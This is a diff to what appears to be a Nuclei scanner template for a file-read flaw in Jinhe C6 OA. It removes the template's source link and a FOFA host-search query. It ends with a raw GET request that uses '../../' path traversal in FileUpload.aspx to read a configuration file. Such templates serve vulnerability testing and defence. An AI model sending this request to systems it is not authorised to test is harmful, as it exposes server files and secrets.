@@ -3,12 +3,8 @@ info:
   name: 金和C6 FileUpload.aspx存在文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dkc24ryvsldlsnup'
+  description: ''
   tags: file-upload,lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dkc24ryvsldlsnup
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /c6/jhsoft.wcf/functionnew/FileUpload.aspx?FileName=../../Resource/JHFileConfig.ini HTTP/1.1
